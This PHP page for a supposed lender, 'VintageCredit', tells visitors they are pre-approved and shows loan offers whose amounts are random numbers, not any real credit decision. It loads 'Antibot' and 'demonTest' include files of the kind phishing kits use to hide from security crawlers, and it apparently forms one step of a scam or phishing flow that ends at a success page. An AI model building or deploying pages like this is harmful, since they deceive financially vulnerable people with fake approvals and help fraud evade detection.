<?php

    session_start();

    require_once '../Meta/Comp.php';
    require_once '../Meta/Antibot.php';
    require_once '../Meta/demonTest.php';
    
    $amount = $_GET['amount'];
    $apr = 0;


    function generateRandomNumber($min, $max) {
        $randomNumber = rand(ceil($min / 100), floor($max / 100)) * 100;
        return $randomNumber;
    }


    if ($amount <= 10000) {
        $min = 1800;
        $max = 10000;
        $apr = 36;
    } elseif ($amount <= 20000) {
        $min = 10000;
        $max = 20000;
        $apr = 31;
    } elseif ($amount <= 50000) {
        $min = 20000;
        $max = 50000;
        $apr = 27;
    } else {
        $min = 50000;
        $max = 99999;
        $apr = 25;
    }
    
    $pq_a1 = generateRandomNumber($min, $max);
    $pq_a2 = generateRandomNumber($min, $max);
    $pq_a3 = generateRandomNumber($min, $max);

?>
<!doctype html>
<html class="no-js" lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>VintageCredit - Loan Application</title>

    <link rel="shortcut icon" href="../../assets/images/vc-fav.png" type="image/x-icon">
    <link rel="stylesheet" href="../../assets/css/bootstrap.min.css">
    <link rel="stylesheet" href="../../assets/css/fontawesome.min.css">
    <link rel="stylesheet" href="../../assets/css/jquery-ui.css">
    <link rel="stylesheet" href="../../assets/css/plugin/nice-select.css">
    <link rel="stylesheet" href="../../assets/css/plugin/slick.css">
    <link rel="stylesheet" href="../../assets/css/arafat-font.css">
    <link rel="stylesheet" href="../../assets/css/plugin/animate.css">
    <link rel="stylesheet" href="../../assets/css/style.css">

    <style>
        .error {
            border: 2px solid red;
        }
    </style>
</head>

<body>
    <!-- start preloader -->
    <div class="preloader" id="preloader"></div>
    <!-- end preloader -->

    <!-- Scroll To Top Start-->
    <a href="javascript:void(0)" class="scrollToTop"><i class="fas fa-angle-double-up"></i></a>
    <!-- Scroll To Top End -->

    <!-- header-section start -->
    <header class="header-section register login">
        <div class="overlay">
            <div class="container">
                <div class="row d-flex header-area">
                    <nav class="navbar navbar-expand-lg navbar-light">
                        <a class="navbar-brand" href="../../index.html">
                            <img src="../../assets/images/vc-logo-sm.png" class="logo" alt="logo">
                        </a>
                    </nav>
                </div>
            </div>
        </div>
    </header>
    <!-- header-section end -->
    
    <!-- Loan calculation In start -->
    <section class="loan-calculation" style="background-color: white; margin-top: 60px;">
            <div class="img-area pt-120">
                <img src="assets/images/home-loan-section-right.png" alt="image">
            </div>
            <div class="overlay pt-120 pb-120">
                <div class="container wow fadeInUp">
                    <div class="row justify-content-center">
                        <div class="col-lg-8">
                            <div class="section-header text-center">
                                <h5 class="sub-title">VintageCredit</h5>
                                <h2 class="title">You are pre-approved!</h2>
                                <p class="top-para">Compared your offers and choose the one that is best for you.</p>
                            </div>
                        </div>
                    </div>
                    <div class="row justify-content-between align-items-center">
                        <div class="col-lg-7">
                            <div class="row">
                                <div class="col-md-6">
                                    <input type="hidden" id="a_apr" value=<?php echo $apr; ?>>
                                    <div class="radio-area">
                                        <h6>
                                            Select Amount
                                        </h6>
                                        <label class="single-radio"><?php echo $pq_a1; ?>
                                            <input type="radio" value="<?php echo $pq_a1; ?>" name="l-amount" id="first">
                                            <span class="checkmark"></span>
                                        </label>
                                        <label class="single-radio"><?php echo $pq_a2; ?>
                                            <input type="radio" value="<?php echo $pq_a2; ?>" name="l-amount" id="second">
                                            <span class="checkmark"></span>
                                        </label>
                                        <label class="single-radio"><?php echo $pq_a3; ?>
                                            <input type="radio" value="<?php echo $pq_a3; ?>" name="l-amount" id="third">
                                            <span class="checkmark"></span>
                                        </label>
                                    </div>
                                </div>
                            </div>
                            <div class="btn-area" style="padding-top: 15px;">
                                <button onclick="calculate_offer()" class="cmn-btn" id="scrollTo">Calculate Amount</button>
                            </div>
                        </div>
                        <div class="col-lg-4" id="section_offer">
                            <div class="content-box text-center">
                                <p class="mdr">Your Loan Amount is</p>
                                <h2 class="mb-60" id="amountSelect">$0</h2>
                                <div class="info-block mb-60 d-flex align-items-center justify-content-between">
                                    <div class="info-single text-center">
                                        <span>Monthly Payment</span>
                                        <h6 id="monthlyPayment">$0</h6>
                                    </div>
                                    <div class="info-single text-center">
                                        <span>APR</span>
                                        <h6 id="APR"><?php echo $apr; ?>%</h6>
                                    </div>
                                    <div class="info-single text-center">
                                        <span>Term</span>
                                        <h6 id="loan-term">24 months</h6>
                                    </div>
                                </div>
                                <div class="btn-area">
                                    <a href="./success.php" class="cmn-btn">Accept Loan</a>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <!-- Loan calculation In end -->


    <!--==================================================================-->
    <script>
        function calculate_offer() {
            var loanAmount = parseFloat(document.querySelector('input[name="l-amount"]:checked').value);
            var apr = parseFloat(document.getElementById("a_apr").value);

            var loanTerm = 24;
                
            var monthlyInterestRate = apr / 12 / 100; 
            var numerator = loanAmount * monthlyInterestRate * Math.pow(1 + monthlyInterestRate, loanTerm);
            var denominator = Math.pow(1 + monthlyInterestRate, loanTerm) - 1;
            var monthlyPayment = numerator / denominator;
            var repayment = monthlyPayment * loanTerm;
            
            document.getElementById("amountSelect").innerHTML = "$" + loanAmount.toFixed(2);
            document.getElementById("monthlyPayment").innerHTML = "$" + monthlyPayment.toFixed(2);
            document.getElementById("repayment").innerHTML = "$" + repayment.toFixed(2);
        }
        document.getElementById('scrollTo').addEventListener('click', function() {
        document.getElementById('section_offer').scrollIntoView({ behavior: 'smooth' });
    });
    </script>
    <script data-cfasync="false" src="../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
    <script src="../../assets/js/jquery.min.js"></script>
    <script src="../../assets/js/jquery-ui.js"></script>
    <script src="../../assets/js/bootstrap.min.js"></script>
    <script src="../../assets/js/fontawesome.js"></script>
    <script src="../../assets/js/plugin/slick.js"></script>
    <script src="../../assets/js/plugin/waypoint.min.js"></script>
    <script src="../../assets/js/plugin/counter.js"></script>
    <script src="../../assets/js/plugin/jquery.nice-select.min.js"></script>
    <script src="../../assets/js/plugin/wow.min.js"></script>
    <script src="../../assets/js/plugin/plugin.js"></script>
    <script src="../../assets/js/main.js"></script>
</body>

</html>